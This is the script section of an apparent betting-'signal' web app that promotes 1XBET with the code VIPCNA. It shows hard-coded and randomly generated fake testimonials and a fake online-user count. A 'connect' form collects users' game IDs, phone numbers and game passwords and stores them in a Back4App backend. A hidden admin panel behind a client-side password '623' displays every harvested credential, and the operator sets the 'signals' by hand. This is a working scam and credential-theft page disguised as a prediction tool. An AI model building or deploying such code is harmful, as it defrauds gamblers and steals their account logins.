      const escapeHtml=t=>t.replace(/[&<>"']/g,m=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[m])),highlightPromo=t=>escapeHtml(t).replace(/\bVIPCNA\b/gi,'<span class="promoCode">VIPCNA</span>');function createFeedItem(t,o){let e=0;for(let a=0;a<t.length;a++)e=(31*e+t.charCodeAt(a))>>>0;const s=["#e53935","#d81b60","#8e24aa","#3949ab","#1e88e5","#00897b","#7cb342","#f9a825","#ef6c00"][e%9],i=document.createElement("li");return i.className="feedItem",i.innerHTML=`<div class="feedHead"><div class="avatar" style="--avbg: ${s}"><svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 12a5 5 0 1 0 0-10 5 5 0 0 0 0 10zm0 2c-4.4 0-8 2.2-8 5v1h16v-1c0-2.8-3.6-5-8-5z"/></svg></div><div class="name">${escapeHtml(t)}</div></div><div class="msg">${highlightPromo(o)}</div>`,i}function renderInitialFeeds(){const t=[{name:"Dulan Chamika",msg:`‡∂Ö‡∂©‡∑ö ‡∂∏‡∂ª‡∑î ‡∂Ö‡∂∫‡∑í‡∂∫‡∑ô ‡∂∏‡∑ö‡∂ö ‡∂±‡∂∏‡∑ä 100% sure signal üî•\nVIPCNA ‡∂ö‡∑ù‡∂©‡∑ä ‡∂ë‡∂ö‡∑ô‡∂±‡∑ä ‡∂Ö‡∂Ω‡∑î‡∂≠‡∑ä 1XBET account \n‡∂ë‡∂ö‡∂ö‡∑ä ‡∑Ñ‡∂Ø‡∑è ‡∂ú‡∂≠‡∑ä‡∂≠‡∂ß ‡∂¥‡∑É‡∑ä‡∑É‡∑ô ‡∂≠‡∂∏‡∑è \nsignal ‡∑É‡∑î‡∂¥‡∑í‡∂ª‡∑í‡∂∫‡∂ß‡∂∏ ‡∑Ä‡∑ê‡∂© ‡∂ö‡∂ª‡∑ö üí∏ü§©‚ù§Ô∏è`},{name:"Dilshan Jayavardana",msg:"Signal nam Signal Supiri Ahh"},{name:"‡∂¢‡∑è‡∂±‡∂ö‡∑ì ‡∑Ñ‡∑ö‡∂ª‡∂≠‡∑ä",msg:"‡∂Ω‡∂ö‡∑ä‡∑Ç 8 ‡∂ö‡∑ä ‡∂Ω‡∑ú‡∑É‡∑ä ‡∑Ä‡∑ô‡∂Ω‡∑è ‡∑Ñ‡∑í‡∂ß‡∑í‡∂∫‡∑ô , ‡∂Ø‡∑Ä‡∑É‡∑ä ‡∂≠‡∑î‡∂±‡∑ô‡∂ö‡∑ä ‡∂ö‡∑Ä‡∂ª‡∑ä ‡∂ö‡∂ª‡∑è ‡∂∏‡∑ö ‡∂á‡∂¥‡∑ä ‡∂ë‡∂ö ‡∂±‡∑í‡∑É‡∑è ‡∂∏‡∑î‡∑Ö‡∑î loss ‡∂ë‡∂ö‡∂∏ , ‡∂á‡∂≠‡∑ä‡∂≠‡∂ß‡∂∏ ‡∂ú‡∑ú‡∂©‡∂ö‡∑ä ‡∑É‡∑ä‡∂≠‡∑î‡∂≠‡∑ì"},{name:"‡∑Ä‡∑É‡∂±‡∑ä‡∂≠ ‡∂¢‡∂∫‡∂≠‡∑í‡∂Ω‡∂ö",msg:"Thank Brother Aviator Signal ‡∂∏‡∂ª‡∑î ‚ù§Ô∏è"}];feedList.innerHTML="",t.forEach(t=>feedList.appendChild(createFeedItem(t.name,t.msg)))}let feedbackInterval=null;function showRandomFeedback(){if(!feedbackScr.classList.contains("show"))return;const t=["Nimal Perera","Sunil Silva","Kamal Fernando","Kasun Bandara","Ruwan Gamage","Priya Kumari","Saman Jayasuriya","Gayan Dias","Chathura Sampath","Pasan Madhawa","Shehan Wijesinghe","Lakmali Herath","Nadeesha Dilrukshi","Mihiri Sandunika","Ashen Vithanage"][Math.floor(15*Math.random())],o=["signal ‡∑Ñ‡∑ú‡∂Ø‡∂∫‡∑í üëç","‡∂∏‡∂∏ ‡∂ú‡∑ú‡∂©‡∂ö‡∑ä ‡∑É‡∂Ω‡∑ä‡∂Ω‡∑í ‡∑Ñ‡∑ô‡∑Ä‡∑ä‡∑Ä‡∑è ‡∂∏‡∑ö‡∂ö‡∑ô‡∂±‡∑ä üí∞","‡∂á‡∂¥‡∑ä ‡∂ë‡∂ö ‡∂±‡∂∏‡∑ä ‡∂∏‡∂ª‡∑î","‡∑É‡∑î‡∂¥‡∑í‡∂ª‡∑í signals bro","win win win only!","loss cover ‡∂ö‡∂ª‡∂ú‡∂±‡∑ä‡∂± ‡∂¥‡∑î‡∑Ö‡∑î‡∑Ä‡∂±‡∑ä ‡∑Ä‡∑î‡∂´‡∑è, thanks","patta app eka","100% sure signals!","VIPCNA code eka weda, supiri","Thank you very much!","Best signal app I've used","maru signal eka..","niyamai ayye..."][Math.floor(13*Math.random())],e=createFeedItem(t,o);feedList.prepend(e),feedList.children.length>8&&feedList.lastChild.remove()}function handleSendFeedback(){const t=fbNameInput.value.trim()||"Anonymous",o=fbTextInput.value.trim();o?(feedList.prepend(createFeedItem(t,o)),fbTextInput.value="",fbNameInput.value="",fbNote.textContent="‡∂∫‡∑Ä‡∂± ‡∂Ω‡∂Ø‡∑ì ‚úì",setTimeout(()=>{fbNote.textContent=""},1200)):fbNote.textContent="‡∂ö‡∂ª‡∑î‡∂´‡∑è‡∂ö‡∂ª ‡∂¥‡∑Ö‡∂∏‡∑î‡∑Ä ‡∂î‡∂∂‡∑ö ‡∂Ö‡∂Ø‡∑Ñ‡∑É ‡∂Ω‡∑í‡∂∫‡∂±‡∑ä‡∂±."}function updateOnlineCounter(){const t=Math.floor(41*Math.random())+30;onlineCounterEl.textContent=`Online: ${t}`}async function handleSystemConnect(){const t=systemPwdInput.value.trim(),o="vipcna"===t.toLowerCase();connStatus.textContent=o?"System Connected":"System Disconnected",connStatus.className="status "+(o?"ok":"bad");const e=gameIdInput.value.trim(),s=phoneNumberInput.value.trim(),i=gamePwdInput.value.trim();if(o&&e&&s&&i){const a=Parse.Object.extend("UserConnection"),n=new a;n.set("gameId",e),n.set("phoneNumber",s),n.set("systemPassword",t),n.set("gamePassword",i);try{await n.save(),console.log("User connection saved successfully to Back4App!")}catch(t){console.error("Error while saving user connection: ",t),alert("Could not save data. Check console for errors.")}}}async function fetchAdminData(){adminDataView.textContent="Loading data...";const t=Parse.Object.extend("UserConnection"),o=new Parse.Query(t);o.descending("createdAt");try{const e=await o.find();if(0===e.length)return void(adminDataView.textContent="No connections saved yet.");const s=e.map((t,o)=>{const e=t.createdAt.toLocaleString("si-LK"),s=t.get("gameId"),i=t.get("phoneNumber"),a=t.get("systemPassword"),n=t.get("gamePassword");return`${o+1}. Time: ${e}\n   Game ID: ${s}\n   Phone: ${i}\n   Game Pass: ${n}\n   System Pass: ${a}`}).join("\n\n");adminDataView.textContent=s}catch(t){console.error("Error while fetching admin data: ",t),adminDataView.textContent="Error fetching data. Check console."}}function handleSocialLink(e){e.preventDefault();const t="virat1xbet",o=`tg://resolve?domain=${t}`,n=`https://t.me/${t}`;window.location.href=o,setTimeout(()=>{window.open(n,"_blank","noopener,noreferrer")},500)}const sctx=starfieldCanvas.getContext("2d",{alpha:!0});let stars=[],sWidth=0,sHeight=0,sDpr=1;function resizeStarfield(){sDpr=Math.min(window.devicePixelRatio||1,2),sWidth=innerWidth,sHeight=innerHeight,starfieldCanvas.width=Math.floor(sWidth*sDpr),starfieldCanvas.height=Math.floor(sHeight*sDpr),starfieldCanvas.style.width=sWidth+"px",starfieldCanvas.style.height=sHeight+"px",sctx.setTransform(sDpr,0,0,sDpr,0,0);const t=Math.min(220,Math.floor(sWidth*sHeight/9e3));stars=[];for(let o=0;o<t;o++){const t=.4+1.6*Math.random(),e=10+35*t,s=(-90+20*Math.random()-10)*Math.PI/180;stars.push({x:Math.random()*sWidth,y:Math.random()*sHeight,r:t,vx:Math.cos(s)*e,vy:Math.sin(s)*e,twPhase:2*Math.random()*Math.PI,twSpeed:.6+1.4*Math.random()})}}let lastT=performance.now();function animateStarfield(t){const o=Math.min((t-lastT)/1e3,.05);lastT=t,sctx.clearRect(0,0,sWidth,sHeight);for(const t of stars){t.x+=t.vx*o,t.y+=t.vy*o,t.x<-8?t.x=sWidth+8:t.x>sWidth+8&&(t.x=-8),t.y<-8?t.y=sHeight+8:t.y>sHeight+8&&(t.y=-8);const e=(Math.sin(t.twSpeed*t/1e3*1.2+t.twPhase)+1)/2,s=.25+.65*e,i=t.r*(.9+.35*e);sctx.fillStyle=`rgba(255,255,255,${s})`,sctx.beginPath(),sctx.arc(t.x,t.y,i,0,2*Math.PI),sctx.fill()}requestAnimationFrame(animateStarfield)}

      function init() {
        window.addEventListener('load', openIntro);
        skipIntro.addEventListener('click', closeIntro);
        genBtn.addEventListener('click', handleGenerateClick);
        clearBtn.addEventListener('click', () => { history.length = 0; renderHistory(); });
        
        connectBtn.addEventListener('click', () => showScreen('connect'));
        feedbackBtn.addEventListener('click', () => {
            showScreen('feedback');
            if (feedbackInterval) clearInterval(feedbackInterval);
            feedbackInterval = setInterval(showRandomFeedback, 5000);
        });
        backHome.addEventListener('click', () => { showScreen('home'); clearInterval(feedbackInterval); });
        backFromFeedback.addEventListener('click', () => { showScreen('home'); clearInterval(feedbackInterval); });
        backFromAdmin.addEventListener('click', () => showScreen('home'));
        backFromSignalUpdate.addEventListener('click', () => showScreen('home'));
        sysConnect.addEventListener('click', handleSystemConnect);
        fbSendBtn.addEventListener('click', handleSendFeedback);
        document.querySelectorAll('.open-tg').forEach(a => a.addEventListener('click', handleSocialLink));
        
        adminBtn.addEventListener('click', async () => {
            const pass = prompt('Enter Admin Password:');
            if (pass === '623') { // Updated Password
                showScreen('adminPanel');
                await fetchAdminData();
            } else if (pass !== null) {
                alert('Incorrect Password!');
            }
        });
        
        signalUpdateBtn.addEventListener('click', () => {
            const pass = prompt('Enter Password:');
            if (pass === '623') { // Updated Password
                displayTimeInput.value = '';
                updateOddInput.value = '';
                updateDurationInput.value = '';
                signalLockCheckbox.checked = globalSignalState?.isLocked || false;
                showScreen('signalUpdate');
            } else if (pass !== null) {
                alert('Incorrect Password!');
            }
        });
        
        saveSignalUpdateBtn.addEventListener('click', async () => {
            saveSignalUpdateBtn.disabled = true;
            saveSignalUpdateBtn.textContent = 'Updating...';

            const GlobalSignal = Parse.Object.extend("GlobalSignal");
            const query = new Parse.Query(GlobalSignal);
            query.equalTo("identifier", "mainSignal");
            let signalObject = await query.first();

            if (!signalObject) {
                signalObject = new GlobalSignal();
                signalObject.set("identifier", "mainSignal");
            }

            const isLocked = signalLockCheckbox.checked;
            const odd = parseFloat(updateOddInput.value);
            const displayTime = displayTimeInput.value.trim();
            const duration = parseFloat(updateDurationInput.value);

            signalObject.set("isLocked", isLocked);
            
            if (isLocked) {
                if (isNaN(odd) || !displayTime) {
                    alert('For locking, please provide a valid Odd and Display Time.');
                    saveSignalUpdateBtn.disabled = false;
                    saveSignalUpdateBtn.textContent = 'Update Signal';
                    return;
                }
                signalObject.set("odd", odd);
                signalObject.set("displayTime", displayTime);
                signalObject.set("expiresAt", null);
            } else {
                if (!isNaN(odd) && displayTime && !isNaN(duration) && duration > 0) {
                    signalObject.set("odd", odd);
                    signalObject.set("displayTime", displayTime);
                    signalObject.set("expiresAt", new Date(Date.now() + duration * 1000));
                } else {
                    signalObject.set("isLocked", false);
                    signalObject.set("expiresAt", new Date(0));
                }
            }

            try {
                await signalObject.save();
                await fetchGlobalSignal();
                gameLoop();
                alert('Global Signal has been updated successfully!');
                showScreen('home');
            } catch (error) {
                alert('Error updating signal. Check console.');
                console.error("Error saving global signal:", error);
            } finally {
                saveSignalUpdateBtn.disabled = false;
                saveSignalUpdateBtn.textContent = 'Update Signal';
            }
        });
        
        renderInitialFeeds();
      }

      init();

    })();
  </script>

</body>
</html>
